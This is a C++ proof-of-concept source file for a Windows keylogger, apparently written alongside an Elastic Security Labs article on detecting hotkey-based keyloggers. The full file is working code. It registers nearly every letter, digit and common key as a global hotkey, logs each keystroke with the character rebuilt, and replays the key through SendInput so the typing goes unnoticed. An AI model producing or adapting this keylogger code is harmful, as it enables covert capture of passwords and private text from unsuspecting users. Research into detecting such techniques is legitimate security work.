// https://www.elastic.co/security-labs/detecting-hotkey-based-keyloggers
// This one simply registers keys as hotkeys using RegisterHotKey API - https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey
// Listens to all these registered hotkey events, for each key pressed:
// 1. Log the key - its a keylogger after all
// 2. Unregister the hotkey
// 3. Send a virtual keypress of the key - otherwise this will distrupt the user
// 4. Re-register the hotkey

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <vector>
#include <map>
#include <string>
#include <atomic>
#include <vector> // Needed for INPUT array

// Linker directive
#pragma comment(lib, "user32.lib")

// --- Globals ---
// Structure to hold original registration info
struct HotkeyInfo {
    UINT vkCode;
    UINT fsModifiers; // Modifiers used during registration (e.g., 0, MOD_SHIFT)
};

// Map to associate our generated hotkey ID with its original registration info
std::map<int, HotkeyInfo> g_hotkeyRegistry;
std::atomic<int> g_nextHotkeyId(1); // Unique ID generator

// --- Helper Functions ---

// Registers a hotkey and stores the mapping
bool RegisterKeyAsHotkey(HWND hwnd, UINT vkCode, UINT fsModifiers) {
    int hotkeyId = g_nextHotkeyId++;
    if (RegisterHotKey(hwnd, hotkeyId, fsModifiers | MOD_NOREPEAT, vkCode)) {
        g_hotkeyRegistry[hotkeyId] = { vkCode, fsModifiers }; // Store VK and original modifiers
        return true;
    }
    else {
        std::cerr << "Warning: Failed to register hotkey for VK=0x" << std::hex << vkCode
            << " Modifiers=0x" << fsModifiers << ". GLE=" << std::dec << GetLastError() << std::endl;
        return false;
    }
}

// Simulates key press/release using SendInput
void SimulateKeyPress(UINT vkCode, UINT modsFromLParam) {
    std::vector<INPUT> inputs;
    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;

    // Use scancode if possible for better compatibility
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    // --- Press Modifiers indicated by lParam ---
    // Note: This uses the state *at the time of hotkey trigger*
    if (modsFromLParam & MOD_SHIFT) {
        input.ki.wVk = VK_SHIFT;
        input.ki.dwFlags = 0; // Press
        inputs.push_back(input);
    }
    if (modsFromLParam & MOD_CONTROL) {
        input.ki.wVk = VK_CONTROL;
        input.ki.dwFlags = KEYEVENTF_EXTENDEDKEY; // Ctrl is extended
        inputs.push_back(input);
    }
    if (modsFromLParam & MOD_ALT) {
        input.ki.wVk = VK_MENU; // VK_MENU is Alt
        input.ki.dwFlags = KEYEVENTF_EXTENDEDKEY; // Alt is extended
        inputs.push_back(input);
    }
    // Note: MOD_WIN isn't reliably captured by standard hotkeys this way,
    // but you could poll GetAsyncKeyState(VK_LWIN) / GetAsyncKeyState(VK_RWIN)
    // right before SendInput if absolutely necessary, though it adds complexity/race conditions.

    // --- Press the actual key ---
    input.ki.wVk = vkCode;
    input.ki.wScan = scanCode;
    // Use KEYEVENTF_SCANCODE if scancode is available
    input.ki.dwFlags = (scanCode > 0 ? KEYEVENTF_SCANCODE : 0);
    // Add KEYEVENTF_EXTENDEDKEY for relevant keys (e.g., Enter, arrows, etc.)
    // This check is simplified; a full implementation would be more thorough.
    if (vkCode == VK_RETURN || vkCode == VK_BACK || vkCode == VK_DELETE ||
        (vkCode >= VK_PRIOR && vkCode <= VK_DOWN) || // PageUp/Down, Home/End, Arrows
        vkCode == VK_INSERT)
    {
        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
    }
    inputs.push_back(input);


    // --- Release the actual key ---
    input.ki.dwFlags |= KEYEVENTF_KEYUP; // Add keyup flag
    inputs.push_back(input);

    // --- Release Modifiers (in reverse order) ---
    input.ki.dwFlags = KEYEVENTF_KEYUP; // Reset base flags to just KeyUp
    if (modsFromLParam & MOD_ALT) {
        input.ki.wVk = VK_MENU;
        input.ki.wScan = MapVirtualKey(VK_MENU, MAPVK_VK_TO_VSC); // Rescan
        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
        if (input.ki.wScan > 0) input.ki.dwFlags |= KEYEVENTF_SCANCODE;
        inputs.push_back(input);
        input.ki.dwFlags &= ~(KEYEVENTF_SCANCODE | KEYEVENTF_EXTENDEDKEY); // Clear optional flags
    }
    if (modsFromLParam & MOD_CONTROL) {
        input.ki.wVk = VK_CONTROL;
        input.ki.wScan = MapVirtualKey(VK_CONTROL, MAPVK_VK_TO_VSC);
        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
        if (input.ki.wScan > 0) input.ki.dwFlags |= KEYEVENTF_SCANCODE;
        inputs.push_back(input);
        input.ki.dwFlags &= ~(KEYEVENTF_SCANCODE | KEYEVENTF_EXTENDEDKEY);
    }
    if (modsFromLParam & MOD_SHIFT) {
        input.ki.wVk = VK_SHIFT;
        input.ki.wScan = MapVirtualKey(VK_SHIFT, MAPVK_VK_TO_VSC);
        // Shift is not typically extended, no KEYEVENTF_EXTENDEDKEY
        if (input.ki.wScan > 0) input.ki.dwFlags |= KEYEVENTF_SCANCODE;
        inputs.push_back(input);
        // No need to clear flags as it's the last one
    }


    // --- Send all inputs ---
    if (!inputs.empty()) {
        UINT uSent = SendInput(static_cast<UINT>(inputs.size()), inputs.data(), sizeof(INPUT));
        if (uSent != inputs.size()) {
            std::cerr << "Warning: SendInput sent " << uSent << " events instead of " << inputs.size() << ". GLE=" << GetLastError() << std::endl;
        }
    }
}


// --- Window Procedure ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_HOTKEY: {
        int hotkeyId = (int)wParam;
        UINT modsTriggered = LOWORD(lParam); // Modifiers active when hotkey was triggered
        UINT vkTriggered = HIWORD(lParam);  // VK code that triggered the hotkey

        HotkeyInfo originalInfo = {}; // Store original registration info

        // --- Find original registration info ---
        auto it = g_hotkeyRegistry.find(hotkeyId);
        if (it != g_hotkeyRegistry.end()) {
            originalInfo = it->second;
            // Sanity check (optional)
            if (originalInfo.vkCode != vkTriggered) {
                std::cerr << "Warning: Hotkey ID " << hotkeyId << " VK mismatch! Map=" << originalInfo.vkCode << ", lParam=" << vkTriggered << std::endl;
                originalInfo.vkCode = vkTriggered; // Use the one from lParam if they differ
            }

            // --- Log the interception AND Reconstructed Character ---
            // <<< CHANGE START >>>
            char finalChar = '\0';
            std::string charDescription = "";

            // Basic reconstruction logic (needs expansion for full layout/symbols)
            bool shiftActive = (modsTriggered & MOD_SHIFT);
            // Note: For accurate CapsLock effect on CHAR, we'd poll GetKeyState(VK_CAPITAL) here.
            //       However, the simulation uses the modsTriggered flags directly.
            //       Let's just simulate based on Shift for this basic example.
            bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0; // Poll for more accurate display

            bool isAlpha = (vkTriggered >= 'A' && vkTriggered <= 'Z');
            bool isNumeric = (vkTriggered >= '0' && vkTriggered <= '9');

            if (isAlpha) {
                bool makeUpper = shiftActive ^ capsLockOn; // XOR for Caps Lock display effect
                finalChar = makeUpper ? (char)vkTriggered : (char)tolower(vkTriggered);
                charDescription = "'";
                charDescription += finalChar;
                charDescription += "'";
            }
            else if (isNumeric) {
                if (shiftActive) {
                    switch (vkTriggered) {
                    case '1': finalChar = '!'; break; case '2': finalChar = '@'; break;
                    case '3': finalChar = '#'; break; case '4': finalChar = '$'; break;
                    case '5': finalChar = '%'; break; case '6': finalChar = '^'; break;
                    case '7': finalChar = '&'; break; case '8': finalChar = '*'; break;
                    case '9': finalChar = '('; break; case '0': finalChar = ')'; break;
                    }
                    if (finalChar != '\0') {
                        charDescription = "'";
                        charDescription += finalChar;
                        charDescription += "'";
                    }
                    else { // Fallback if no symbol defined
                        charDescription = "(Shift+'";
                        charDescription += (char)vkTriggered;
                        charDescription += "')";
                    }
                }
                else {
                    finalChar = (char)vkTriggered;
                    charDescription = "'";
                    charDescription += finalChar;
                    charDescription += "'";
                }
            }
            else {
                // Add simple descriptions for other registered keys
                switch (vkTriggered) {
                case VK_SPACE: charDescription = "[Space]"; break;
                case VK_RETURN: charDescription = "[Enter]"; break;
                case VK_BACK: charDescription = "[Backspace]"; break;
                case VK_OEM_PERIOD: charDescription = shiftActive ? ">" : "."; break;
                case VK_OEM_COMMA: charDescription = shiftActive ? "<" : ","; break;
                case VK_OEM_MINUS: charDescription = shiftActive ? "_" : "-"; break;
                    // Add more VK_OEM_* or other VK codes as needed
                default: charDescription = "(Other)"; break;
                }
            }

            std::cout << "[Hotkey ID=" << hotkeyId << ", VK=0x" << std::hex << vkTriggered
                << ", Mods=0x" << modsTriggered << std::dec << "] Intercepted "
                << charDescription << ". Simulating..." << std::endl;
            // <<< CHANGE END >>>


           // --- 1. Unregister the Hotkey Temporarily ---
            if (!UnregisterHotKey(hwnd, hotkeyId)) {
                std::cerr << "Warning: Failed to UNregister hotkey ID " << hotkeyId << ". GLE=" << GetLastError() << std::endl;
            }

            // --- 2. Simulate the Original Key Press ---
            SimulateKeyPress(vkTriggered, modsTriggered);

            // --- 3. Re-register the Hotkey ---
            // Sleep(1); // Optional delay
            if (!RegisterHotKey(hwnd, hotkeyId, originalInfo.fsModifiers | MOD_NOREPEAT, originalInfo.vkCode)) {
                std::cerr << "ERROR: Failed to RE-register hotkey ID " << hotkeyId << "! Key will no longer be logged/intercepted. GLE=" << GetLastError() << std::endl;
                g_hotkeyRegistry.erase(hotkeyId);
            }

        }
        else {
            std::cerr << "Warning: Received unknown hotkey ID: " << hotkeyId << std::endl;
        }
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}


int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    LPCWSTR CLASS_NAME = L"HotkeyForwardingKeyloggerPoCWindowClass";

    // --- Register window class ---
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    if (!RegisterClass(&wc)) { /* Error handling */ return 1; }

    // --- Create hidden window ---
    HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"Hotkey Forwarding PoC", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (hwnd == NULL) { /* Error handling */ return 1; }

    std::cout << "Hotkey Forwarding Keylogger PoC - Listening..." << std::endl;
    std::cout << "Registered keys will be intercepted, simulated, then re-intercepted." << std::endl;

    // --- Register Hotkeys (Same as before) ---
    // A-Z (No Modifiers and Shift)
    for (UINT vk = 'A'; vk <= 'Z'; ++vk) {
        RegisterKeyAsHotkey(hwnd, vk, 0);
        RegisterKeyAsHotkey(hwnd, vk, MOD_SHIFT);
    }
    // 0-9 (No Modifiers and Shift)
    for (UINT vk = '0'; vk <= '9'; ++vk) {
        RegisterKeyAsHotkey(hwnd, vk, 0);
        RegisterKeyAsHotkey(hwnd, vk, MOD_SHIFT);
    }
    // Add other common keys
    RegisterKeyAsHotkey(hwnd, VK_SPACE, 0);
    RegisterKeyAsHotkey(hwnd, VK_RETURN, 0);
    RegisterKeyAsHotkey(hwnd, VK_BACK, 0);
    RegisterKeyAsHotkey(hwnd, VK_OEM_PERIOD, 0);
    RegisterKeyAsHotkey(hwnd, VK_OEM_PERIOD, MOD_SHIFT); // '>'
    RegisterKeyAsHotkey(hwnd, VK_OEM_COMMA, 0);
    RegisterKeyAsHotkey(hwnd, VK_OEM_COMMA, MOD_SHIFT); // '<'
    RegisterKeyAsHotkey(hwnd, VK_OEM_MINUS, 0);
    RegisterKeyAsHotkey(hwnd, VK_OEM_MINUS, MOD_SHIFT); // '_'
     // ... etc. Add more keys/symbols as desired for testing ...


    std::cout << "Registered " << g_hotkeyRegistry.size() << " hotkeys." << std::endl;
    std::cout << "Press Ctrl+C in console to exit." << std::endl;

    // --- Message Loop ---
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // --- Cleanup ---
    std::cout << "\nExiting. Unregistering hotkeys..." << std::endl;
    // Unregister remaining hotkeys (might include ones that failed re-registration)
    for (const auto& pair : g_hotkeyRegistry) {
        UnregisterHotKey(hwnd, pair.first);
    }
    // Also attempt unregister for IDs that might have failed re-registration
    // (Loop from 1 up to g_nextHotkeyId - 1) - More robust cleanup needed for production.

    g_hotkeyRegistry.clear();
    DestroyWindow(hwnd);
    std::cout << "Cleanup complete." << std::endl;
    return (int)msg.wParam;
}
